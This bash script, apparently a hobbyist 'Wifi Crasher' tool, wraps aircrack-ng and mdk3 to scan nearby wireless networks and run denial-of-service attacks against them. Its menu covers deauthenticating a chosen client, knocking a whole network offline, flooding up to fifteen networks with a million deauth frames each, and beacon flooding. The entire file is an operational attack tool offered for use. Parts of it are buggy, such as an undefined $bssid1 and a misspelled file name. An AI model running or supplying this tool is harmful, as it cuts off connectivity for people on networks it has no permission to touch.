 #!/bin/bash

 #### Colors ####
 
green="\033[32;1m"
yellow="\033[33;1m"
red="\033[31;1m"
purple="\033[37;1m"
cyan="\033[36;1m"

#### Banner ####

Banner(){
echo ${green}
clear
echo 
echo
echo  ''' 


  _    _ _  __ _    _____               _ 
 | |  | (_)/ _(_)  /  __ \             | |
 | |  | |_| |_ _   | /  \/_ __ __ _ ___| |__    ___ _ __
 | |/\| | |  _| |  | |   |  __/  _ /  __| _ \  / _ \ __|
 \  /\  / | | | |  | \__/\ | | (_| \__ \ | | |  __/ |
  \/  \/|_|_| |_|   \____/_|  \__,_|___/_| |_|\___|_|   
'''
}                                                       


 #### Variables ####

  Interface=wlo1
  wifiInterfaceMon="${Interface}mon"
  AirMonitor=airmon-ng
  AirDumper=airodump-ng
  AirAttack=aireplay-ng
  MDK=mdk3
  Tool=xterm
  sniffer=tcpdump

#### Countdown ####

CountDown(){
   i=15
until [ $i -lt 0 ]
do
    echo Starting attack in $i
sleep 1
    ((i--))
done
}


 #### Menu option


        Menuoption() {
        Banner
         echo
          echo
           echo    $purple"{"$cyan"1"$purple"}"$yellow"--"$green"Client Deauth"
             echo    $purple"{"$cyan"2"$purple"}"$yellow"--"$green"Network Deauth"
              echo    $purple"{"$cyan"3"$purple"}"$yellow"--"$green"Street Deauth "
              echo    $purple"{"$cyan"4"$purple"}"$yellow"--"$green"Beacon Flooding"
               echo    $purple"{"$cyan"5"$purple"}"$yellow"--"$green"Restart Networking services"
                echo    $purple"{"$cyan"6"$purple"}"$yellow"--"$green"Exit "
                 echo
                            echo $purple "╭─"$green"Select Attack mode (-_-) "$purple
                           read -p " ╰─$ " get
  
                                if [ $get -eq 1 ];
                                        then
                                                ClientDeauth

                                        elif [ $get -eq 2 ];
                                                then
                                                        NetworkDeauth

                                                elif [ $get -eq 3 ];
                                                        then
                                                                StreetDeauth

                                                                        elif [ $get -eq 4 ];
                                                                                then

                                                                        BeaconFlood

                                                                                elif [ $get -eq 5 ];
                                                                                        then
                                                                         
                                                                         echo              
                                                                            echo "Restarting Network services..."
                                                                               $AirMonitor stop $wifiInterfaceMon >> /dev/null
                                                                                sleep 2
                                                                                  echo "The restart has been succesfull..."



                                                                  elif [ $get -eq 6 ];
                                                              then
                                                          echo ${red}                                  
                                                         echo "BYEEE >:)"  
                                                            exit
                                                                  else
                                                                    sleep 1
                                                                    restartprogram
                                                                        fi
                                                                                }


#### Messages ####

InterMsg(){

        echo $purple "|_"$green"starting youre interface "$purple
        echo
}

InterMsg2(){
echo
echo  "[${Green}${wifiInterfaceMon}${White}+] Preparing for attack..."
echo  "[${Green}${wifiInterfaceMon}${White}+] Sending DeAuth to target..." 
echo  "[${Green}${wifiInterfaceMon}${White}+] Press ctrl+c to stop the attack..."
       
}

InterMsg3(){
echo
echo "$purple"Attack "$green"COMLETED to 100% "$purple"finishing tool tasks"$purple"
}


##### Monitor mode, scan available networks & select target #####


MonitorMode(){      
       if $AirMonitor start $Interface >> /dev/null
        then echo starting monitor mode with $Interface
        sleep 2
        echo Scanning Networks...
                trap "airmon-ng stop $wifiInterfaceMon > /dev/null;rm generated-01.kismet.csv handshake-01.cap 2> /dev/null" EXIT
                airodump-ng --output-format kismet --write generated $wifiInterfaceMon > /dev/null & sleep 15 ; kill $!
                echo showing networks available...
                        sed -i '1d' generated-01.kismet.csv
                        echo  "\n\n${Red}SerialNo       WiFi Network${White}"
                        cut -d ";" -f 3 generated-01.kismet.csv | nl -n ln -w 8
                                targetNumber=1000
                                while [ ${targetNumber} -gt `wc -l generated-01.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber} -lt 1 ]; do 
                                        echo "\n${red}┌─[${red}Select Target${red}]──[${red}~${red}]─[${red}Network${red}]:"
                                        read -p "└─────►$(tput setaf 7) " targetNumber
                                        done
                                        targetName=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 3 `
                                        bssid=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 4 `
                                        channel=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 6 `
                                                rm generated-01.kismet.csv 2> /dev/null

                                                else
                                                Banner
  echo
  echo
  echo "The tool dont start restart the software or the NIC and try again" 
   echo
    echo
    exit
fi

}


 #### Client Deauth ####


ClientDeauth(){  
   InterMsg
        echo 
         echo 
          MonitorAttack1        
}

 #### Network Deauth ####


NetworkDeauth(){
        
      InterMsg
            echo 
              echo
               MonitorAttack2

}

 #### Street Deauth ####


StreetDeauth(){
        
        InterMsg
            echo 
            echo 
             MonitorMode2
                MonitorAttack3

}

#### Monitor attacks ####

MonitorAttack1(){
MonitorMode
echo  "[${Green}${wifiInterfaceMon}${White}] Write the client MAC..." &
        if sudo $Tool -e nano &
           echo  "[${Green}${wifiInterfaceMon}${White}] Showing clients..."
        then sudo $Tool -e $AirDumper --bssid $bssid --channel $channel  $wifiInterfaceMon 
                echo
                read -p " Paste the target client bssid: " mac
                echo "[+] client catched"
                sleep 3
                InterMsg2
                        if sudo $Tool -fg red  -e $AirAttack -0 1000000 -a $bssid -c $mac $wifiInterfaceMon
                        then InterMsg3
                        else echo "You dont have installed xterm requeriments install with sudo apt install xterm"
                          echo "The attack has not been executed restarting tool..."
                                Menuoption
                        fi
                         fi
                                        }

MonitorAttack2(){
MonitorMode
$AirDumper --bssid $bssid --channel $channel $wifiInterfaceMon > /dev/null & sleep 5 ; kill $!  
echo  "[${Green}${targetName}${White}] DoS started, all devices disconnected... "
sleep 0.5
echo  "[${Green}DoS${White}] Press ctrl+c to stop attack & exit..."
if sudo $Tool -fg red -e $AirAttack -0 100000 -a $bssid -c $bssid $wifiInterfaceMon 
then InterMsg3
else 
echo
echo "You dont have installed xterm requeriments install with sudo apt install xterm"
echo
echo
fi
}



MonitorMode2(){      
$AirMonitor start $Interface >> /dev/null
echo starting monitor mode with $Interface
sleep 2
echo Scanning Networks...


#### Files maker ####

airodump-ng --output-format kismet --write generated $wifiInterfaceMon > /dev/null & airodump-ng --output-format kismet --write generated $wifiInterfaceMon > /dev/null & 
airodump-ng --output-format kismet --write generated $wifiInterfaceMon > /dev/null & airodump-ng --output-format kismet --write generated $wifiInterfaceMon > /dev/null & 
airodump-ng --output-format kismet --write generated $wifiInterfaceMon > /dev/null & airodump-ng --output-format kismet --write generated $wifiInterfaceMon > /dev/null & 
airodump-ng --output-format kismet --write generated $wifiInterfaceMon > /dev/null & airodump-ng --output-format kismet --write generated $wifiInterfaceMon > /dev/null & 
airodump-ng --output-format kismet --write generated $wifiInterfaceMon > /dev/null & airodump-ng --output-format kismet --write generated $wifiInterfaceMon > /dev/null & 
airodump-ng --output-format kismet --write generated $wifiInterfaceMon > /dev/null & airodump-ng --output-format kismet --write generated $wifiInterfaceMon > /dev/null & 
airodump-ng --output-format kismet --write generated $wifiInterfaceMon > /dev/null & airodump-ng --output-format kismet --write generated $wifiInterfaceMon > /dev/null & 
airodump-ng --output-format kismet --write generated $wifiInterfaceMon > /dev/null & airodump-ng --output-format kismet --write generated $wifiInterfaceMon > /dev/null &
airodump-ng --output-format kismet --write generated $wifiInterfaceMon > /dev/null & 

rm generated-16.kismet.csv & rm gerated-17.kismet.csv & 

sleep 10 ; kill $!

echo showing networks available...

sed -i '1d' generated-01.kismet.csv
clear
sed -i '1d' generated-02.kismet.csv
clear
sed -i '1d' generated-03.kismet.csv
clear
sed -i '1d' generated-04.kismet.csv
clear
sed -i '1d' generated-05.kismet.csv
clear
sed -i '1d' generated-06.kismet.csv
clear
sed -i '1d' generated-07.kismet.csv
clear
sed -i '1d' generated-08.kismet.csv
clear
sed -i '1d' generated-09.kismet.csv
clear
sed -i '1d' generated-10.kismet.csv
clear
sed -i '1d' generated-11.kismet.csv
clear
sed -i '1d' generated-12.kismet.csv
clear
sed -i '1d' generated-13.kismet.csv
clear
sed -i '1d' generated-14.kismet.csv
clear
sed -i '1d' generated-15.kismet.csv


echo  "\n\n${Red}SerialNo        WiFi Network${White}"

cut -d ";" -f 3 generated-01.kismet.csv | nl -n ln -w 8
clear
cut -d ";" -f 3 generated-02.kismet.csv | nl -n ln -w 8
clear
cut -d ";" -f 3 generated-03.kismet.csv | nl -n ln -w 8
clear
cut -d ";" -f 3 generated-04.kismet.csv | nl -n ln -w 8
clear
cut -d ";" -f 3 generated-05.kismet.csv | nl -n ln -w 8
clear
cut -d ";" -f 3 generated-06.kismet.csv | nl -n ln -w 8
clear
cut -d ";" -f 3 generated-07.kismet.csv | nl -n ln -w 8
clear
cut -d ";" -f 3 generated-08.kismet.csv | nl -n ln -w 8
clear
cut -d ";" -f 3 generated-09.kismet.csv | nl -n ln -w 8
clear
cut -d ";" -f 3 generated-10.kismet.csv | nl -n ln -w 8
clear
cut -d ";" -f 3 generated-11.kismet.csv | nl -n ln -w 8
clear
cut -d ";" -f 3 generated-12.kismet.csv | nl -n ln -w 8
clear
cut -d ";" -f 3 generated-13.kismet.csv | nl -n ln -w 8
clear
cut -d ";" -f 3 generated-14.kismet.csv | nl -n ln -w 8
clear
cut -d ";" -f 3 generated-15.kismet.csv | nl -n ln -w 8

#### Variables list ####

targetNumber=1000
targetNumber2=1000
targetNumber3=1000
targetNumber4=1000
  targetNumber5=1000
    targetNumber6=1000
        targetNumber7=1000
         targetNumber8=1000
            targetNumber9=1000
              targetNumber10=1000
                targetNumber11=1000
                  targetNumber12=1000
                    targetNumber13=1000
                      targetNumber14=1000
                         targetNumber15=1000


#### Target select ####

while [ ${targetNumber} -gt `wc -l generated-01.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber} -lt 1 ]; do 
echo "\n${Green}┌─[${Red}Select Targets${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
read -p "└─────►$(tput setaf 7) " targetNumber 
done

targetName=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 3 `
bssid=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 4 `
channel=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 6 `



        while [ ${targetNumber2} -gt `wc -l generated-02.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber2} -lt 1 ]; do 
        echo "\n${Green}┌─[${Red}Select Targets${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
        read -p "└─────►$(tput setaf 7) " targetNumber2
        done 

        targetName2=`sed -n "${targetNumber2}p" < generated-02.kismet.csv | cut -d ";" -f 3 `
        bssid2=`sed -n "${targetNumber2}p" < generated-02.kismet.csv | cut -d ";" -f 4 `
        channel2=`sed -n "${targetNumber2}p" < generated-02.kismet.csv | cut -d ";" -f 6 `



                while [ ${targetNumber3} -gt `wc -l generated-03.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber3} -lt 1 ]; do 
                echo "\n${Green}┌─[${Red}Select Targets${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
                read -p "└─────►$(tput setaf 7) " targetNumber3 
                done

                targetName3=`sed -n "${targetNumber3}p" < generated-03.kismet.csv | cut -d ";" -f 3 `
                bssid3=`sed -n "${targetNumber3}p" < generated-03.kismet.csv | cut -d ";" -f 4 `
                channel3=`sed -n "${targetNumber3}p" < generated-03.kismet.csv | cut -d ";" -f 6 `



                        while [ ${targetNumber4} -gt `wc -l generated-04.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber4} -lt 1 ]; do 
                        echo "\n${Green}┌─[${Red}Select Targets${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
                        read -p "└─────►$(tput setaf 7) " targetNumber4 
                        done

                        targetName4=`sed -n "${targetNumber4}p" < generated-04.kismet.csv | cut -d ";" -f 3 `
                        bssid4=`sed -n "${targetNumber4}p" < generated-04.kismet.csv | cut -d ";" -f 4 `
                        channel4=`sed -n "${targetNumber4}p" < generated-04.kismet.csv | cut -d ";" -f 6 `



                                while [ ${targetNumber5} -gt `wc -l generated-05.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber5} -lt 1 ]; do 
                                echo "\n${Green}┌─[${Red}Select Targets${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
                                read -p "└─────►$(tput setaf 7) " targetNumber5
                                done

                                targetName5=`sed -n "${targetNumber5}p" < generated-05.kismet.csv | cut -d ";" -f 3 `
                                bssid5=`sed -n "${targetNumber5}p" < generated-05.kismet.csv | cut -d ";" -f 4 `
                                channel5=`sed -n "${targetNumber5}p" < generated-05.kismet.csv | cut -d ";" -f 6 `



                        while [ ${targetNumber6} -gt `wc -l generated-06.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber6} -lt 1 ]; do 
                        echo "\n${Green}┌─[${Red}Select Targets${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
                        read -p "└─────►$(tput setaf 7) " targetNumber6 
                        done

                        targetName6=`sed -n "${targetNumber6}p" < generated-06.kismet.csv | cut -d ";" -f 3 `
                        bssid6=`sed -n "${targetNumber6}p" < generated-06.kismet.csv | cut -d ";" -f 4 `
                        channel6=`sed -n "${targetNumber6}p" < generated-06.kismet.csv | cut -d ";" -f 6 `



                while
                [ ${targetNumber7} -gt `wc -l generated-07.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber7} -lt 1 ]; do 
                echo "\n${Green}┌─[${Red}Select Targets${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
                read -p "└─────►$(tput setaf 7) " targetNumber7
                done 

                targetName7=`sed -n "${targetNumber7}p" < generated-07.kismet.csv | cut -d ";" -f 3 `
                bssid7=`sed -n "${targetNumber7}p" < generated-07.kismet.csv | cut -d ";" -f 4 `
                channel7=`sed -n "${targetNumber7}p" < generated-07.kismet.csv | cut -d ";" -f 6 `



        while [ ${targetNumber8} -gt `wc -l generated-08.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber8} -lt 1 ]; do 
        echo "\n${Green}┌─[${Red}Select Targets${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
        read -p "└─────►$(tput setaf 7) " targetNumber8
        done

        targetName8=`sed -n "${targetNumber8}p" < generated-08.kismet.csv | cut -d ";" -f 3 `
        bssid8=`sed -n "${targetNumber8}p" < generated-08.kismet.csv | cut -d ";" -f 4 `
        channel8=`sed -n "${targetNumber8}p" < generated-08.kismet.csv | cut -d ";" -f 6 `



                while [ ${targetNumber9} -gt `wc -l generated-09.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber9} -lt 1 ]; do 
                        echo "\n${Green}┌─[${Red}Select Targets${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
                        read -p "└─────►$(tput setaf 7) " targetNumber9
                        done

                        targetName9=`sed -n "${targetNumber9}p" < generated-09.kismet.csv | cut -d ";" -f 3 `
                        bssid9=`sed -n "${targetNumber9}p" < generated-09.kismet.csv | cut -d ";" -f 4 `
                        channel9=`sed -n "${targetNumber9}p" < generated-09.kismet.csv | cut -d ";" -f 6 `



                                while [ ${targetNumber10} -gt `wc -l generated-10.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber10} -lt 1 ]; do 
                                echo "\n${Green}┌─[${Red}Select Targets${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
                                read -p "└─────►$(tput setaf 7) " targetNumber10 
                                done

                                targetName10=`sed -n "${targetNumber10}p" < generated-10.kismet.csv | cut -d ";" -f 3 `
                                bssid10=`sed -n "${targetNumber10}p" < generated-10.kismet.csv | cut -d ";" -f 4 `
                                channel10=`sed -n "${targetNumber10}p" < generated-10.kismet.csv | cut -d ";" -f 6 `



        while [ ${targetNumber11} -gt `wc -l generated-11.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber11} -lt 1 ]; do 
        echo "\n${Green}┌─[${Red}Select Targets${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
        read -p "└─────►$(tput setaf 7) " targetNumber11
       done
        targetName11=`sed -n "${targetNumber11}p" < generated-11.kismet.csv | cut -d ";" -f 3 `
        bssid11=`sed -n "${targetNumber11}p" < generated-11.kismet.csv | cut -d ";" -f 4 `
        channel11=`sed -n "${targetNumber11}p" < generated-11.kismet.csv | cut -d ";" -f 6 `

                        while [ ${targetNumber12} -gt `wc -l generated-12.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber12} -lt 1 ]; do 
                        echo "\n${Green}┌─[${Red}Select Targets${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
                        read -p "└─────►$(tput setaf 7) " targetNumber12 
                        done 

                        targetName12=`sed -n "${targetNumber12}p" < generated-12.kismet.csv | cut -d ";" -f 3 `
                        bssid12=`sed -n "${targetNumber12}p" < generated-12.kismet.csv | cut -d ";" -f 4 `
                        channel12=`sed -n "${targetNumber12}p" < generated-12.kismet.csv | cut -d ";" -f 6 `



                                while [ ${targetNumber13} -gt `wc -l generated-13.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber13} -lt 1 ]; do 
                                echo "\n${Green}┌─[${Red}Select Targets${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
                                read -p "└─────►$(tput setaf 7) " targetNumber13
                                done

                                targetName13=`sed -n "${targetNumber13}p" < generated-13.kismet.csv | cut -d ";" -f 3 `
                                bssid13=`sed -n "${targetNumber13}p" < generated-13.kismet.csv | cut -d ";" -f 4 `
                                channel13=`sed -n "${targetNumber13}p" < generated-13.kismet.csv | cut -d ";" -f 6 `



                                        while [ ${targetNumber14} -gt `wc -l generated-14.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber14} -lt 1 ]; do 
                                        echo "\n${Green}┌─[${Red}Select Targets${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
                                        read -p "└─────►$(tput setaf 7) " targetNumber14
                                        done

                                        targetName14=`sed -n "${targetNumber14}p" < generated-14.kismet.csv | cut -d ";" -f 3 `
                                        bssid14=`sed -n "${targetNumber14}p" < generated-14.kismet.csv | cut -d ";" -f 4 `
                                        channel14=`sed -n "${targetNumber14}p" < generated-14.kismet.csv | cut -d ";" -f 6 `



       while [ ${targetNumber15} -gt `wc -l generated-15.kismet.csv | cut -d " " -f 1` ] || [ ${targetNumber15} -lt 1 ]; do 
       echo "\n${Green}┌─[${Red}Select Targets${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
       read -p "└─────►$(tput setaf 7) " targetNumber15
                done

        targetName15=`sed -n "${targetNumber15}p" < generated-15.kismet.csv | cut -d ";" -f 3 `
        bssid15=`sed -n "${targetNumber15}p" < generated-15.kismet.csv | cut -d ";" -f 4 `
       channel15=`sed -n "${targetNumber15}p" < generated-15.kismet.csv | cut -d ";" -f 6 `

clear

rm generated-01.kismet.csv 2> /dev/null
echo  "Preparing for attack..."
sleep 3

MonitorAttack3
}

MonitorAttack3(){

sudo $Tool -e $AirAttack -0 1000000 -a $bssid1 -c $bssid1 $wifiInterfaceMon >> /dev/null & sudo $Tool -e $AirAttack -0 1000000 -a $bssid2 -c $bssid2 $wifiInterfaceMon >> /dev/null &&
sudo $Tool -e $AirAttack -0 1000000 -a $bssid3 -c $bssid3 $wifiInterfaceMon >> /dev/null & sudo $Tool -e $AirAttack -0 1000000 -a $bssid4 -c $bssid4 $wifiInterfaceMon >> /dev/null &&
sudo $Tool -e $AirAttack -0 1000000 -a $bssid5 -c $bssid5 $wifiInterfaceMon >> /dev/null & sudo $Tool -e $AirAttack -0 1000000 -a $bssid6 -c $bssid6 $wifiInterfaceMon >> /dev/null &&
sudo $Tool -e $AirAttack -0 1000000 -a $bssid7 -c $bssid7 $wifiInterfaceMon >> /dev/null & sudo $Tool -e $AirAttack -0 1000000 -a $bssid8 -c $bssid8 $wifiInterfaceMon >> /dev/null &&
sudo $Tool -e $AirAttack -0 1000000 -a $bssid9 -c $bssid9 $wifiInterfaceMon >> /dev/null & sudo $Tool -e $AirAttack -0 1000000 -a $bssid10 -c $bssid10 $wifiInterfaceMon >> /dev/null &&
sudo $Tool -e $AirAttack -0 1000000 -a $bssid11 -c $bssid11 $wifiInterfaceMon >> /dev/null & sudo $Tool -e $AirAttack -0 1000000 -a $bssid12 -c $bssid12 $wifiInterfaceMon >> /dev/null &&
sudo $Tool -e $AirAttack -0 1000000 -a $bssid13 -c $bssid13 $wifiInterfaceMon >> /dev/null & sudo $Tool -e $AirAttack -0 1000000 -a $bssid14 -c $bssid14 $wifiInterfaceMon >> /dev/null &&  
sudo $Tool -e $AirAttack -0 1000000 -a $bssid15 -c $bssid15 $wifiInterfaceMon >> /dev/null 

InterMsg3


}

#### Beacon flood monitor mode #### 

MonitorMode3(){
       $Tool -e $AirMonitor start $Interface >> /dev/null && $Tool -e $AirDumper $wifiInterfaceMon
}

#### Monitor mode 3 options ####

Yes(){
echo ""
echo "You take the Yes option starting sniffing services"        
sleep 1,2
MonitorMode3
}

No(){
echo ""
$AirMonitor start $Interface >> /dev/null
echo "You take the No option starting Beacon flooding menu"        
sleep 1,5


}

#### Realtime attack sniffing packets####

Realtimer(){
$Tool -title Real_time_attack_stream -fg green -e $sniffer -i $wifiInterfaceMon 
}

#### Monitor mode 3 actions ####

WifiSpy_Choose(){
 
 if [ $get -eq 1 ];
then
Yes



elif [ $get -eq 2 ];
then 
No


 
 fi

}

option(){
echo "You want to see the avalaible network channels in youre area ???"
read -p " Press 1 for Yes  2 for No $ " get
WifiSpy_Choose
}


#### Personalitzed and default beacon flood attack options ####

yes(){
        echo ""
        echo "making file"
             touch names >> /dev/null
                echo "Write the names that you want on file"
                echo "When you finish to write the names push ctrl+s to save and after ctrl+x to exit"
                echo ""
                sleep 3,6
                nano names

        if echo "starting personalized beacon flood attack"
        then 
        echo "starting stream attack"
        Realtimer &
        sleep 1,2 & 
        $MDK $wifiInterfaceMon d -c $ch &
        x-terminal-emulator -e $MDK $wifiInterfaceMon b -f names
fi

}


no(){
      echo ""
      if echo "starting stream attack"
         echo ""
        echo "starting default attack"
        Realtimer &
        then $MDK $wifiInterfaceMon d -c $ch & 
        x-terminal-emulator -e $MDK $wifiInterfaceMon b -a -s 9000000000000000000
 fi
  
}

Choose(){
echo "You want to do a personalized attack ???" 
read -p " Press 1 for Yes  2 for No $ " get
Election

}

#### Beacon flood attack options ####

Election(){
 if [ $get -eq 1 ];
then
yes

InterMsg3

elif [ $get -eq 2 ];
then
no

InterMsg3        
 
 fi

}


#### Beacon flooding option menu ####

BeaconFlood(){
echo ""
echo "starting the 'joke mode'"
sleep 2 
echo ""
        option


        echo "What channel of 1-13 you want to attack ???"
        echo ""
     
       read -p "└─────►$(tput setaf 7) " ch
Choose
}


FuncioRecon(){
Banner    
Menuoption
}     
FuncioRecon                                                  
